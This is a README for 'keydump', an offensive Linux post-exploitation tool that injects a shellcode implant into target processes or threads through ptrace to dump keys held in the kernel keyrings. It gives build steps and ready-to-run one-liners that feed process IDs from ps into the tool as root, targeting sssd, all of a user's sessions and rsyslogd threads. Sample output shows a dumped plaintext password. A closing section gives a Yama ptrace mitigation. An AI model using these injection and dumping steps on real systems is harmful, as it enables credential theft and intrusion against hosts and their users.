# keydump

A tool to dump the keys from the Linux Key Management facility, usually known as
Linux keyrings. 

Since many keys are restricted to only be accesible by a process or threads,
this tool will inject a shellcode implant into the specified target processes or
threads in order to dump the keys.

The shellcode implant was created based on
[shellnova](https://github.com/zer1t0/shellnova).

## Build


In order to build the tool, several dependencies are required to compile both
the main program (rust) and the implant (C and assembly):

1. [Install rust](https://www.rust-lang.org/tools/install)

```
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

2. Install implant dependencies
```
sudo apt install cmake nasm build-essential python3-pip
pip install -r keydump/implant/scripts/requeriments.txt
```

Once the dependencies were installed, we can build the software with:
```
cargo build --release
```
This command should create the binary in `keydump/target/release/keydump`
that you can copy whatever you want.

Note: Be sure to compile the project in an environment similar to the one in
which the project will be executed.

## Use

Without arguments, the program will dump the keys that are reachable by the
current context and store them in a folder:

```
$ ./keydump
Files written to /tmp/k_self_1000
$  ls /tmp/k_self_1000/
16263150_keyring__ses__1           329bb7fc_keyring__uid_1000__empty
16853a8f_keyring__uid_ses_1000__1  ae6920f_keyring__ses__1
```

On the other hand, if you pass one or several PIDs to the program as input, it
will dump the keys reached by those processes. You can pass them by stdin by
specifying the `-` character.

In order to specify pids, you can use the `ps` command to list processes with
different filters.

The tool is intended to be used as root, but can be useful as a regular user to
dump keys of other sessions.

Example: Dumping keys of sssd process.

```
$ ps -o pid --no-headers -C sssd | sed 's/ //g' | sudo ./keydump -
[PID 452] Shellcode injected
[PID 452] /tmp/k_452 exists, so keys must be dumped!!
$ sudo cat /tmp/k_452/210e3b29_user_Administrator_dev_lab__10
S3cur3p4ss
```

Example: Keys of all sessions of one user (named user): 

```
$ ps -dNo user,pid,sid | grep -E "^user +" | awk '{ print $2 }' | sudo ./keydump -
[PID 767] Shellcode injected
[PID 787] Shellcode injected
[PID 767] /tmp/k_767 exists, so keys must be dumped!!
[PID 787] /tmp/k_787 exists, so keys must be dumped!!
```

Example: Keys of all process threads.
```
$ ps -o lwp --no-headers -LC rsyslogd | awk '{ print $1 }' | sudo ./keydump -
[PID 450] Shellcode injected
[PID 456] Shellcode injected
[PID 457] Shellcode injected
[PID 458] Shellcode injected
[PID 450] /tmp/k_450 exists, so keys must be dumped!!
[PID 456] /tmp/k_456 exists, so keys must be dumped!!
[PID 457] /tmp/k_457 exists, so keys must be dumped!!
[PID 458] /tmp/k_458 exists, so keys must be dumped!!
```

## Supported architectures

Since the implant shellcode is partially programmed in assembly only the
following architectures are supported:

- [x] amd64
- [ ] x86 (32 bits)
- [ ] ARM

## How to protect from this tool

In order to avoid root, or any user with the `CAP_SYS_PTRACE` capability, to
attach to other processes with ptrace, it is possible to indicate
[Yama](https://www.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) to
block ptrace:
```
echo 3 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

An alternative could be protecting the environment with SELinux, but I'm not an
expert in that topic.
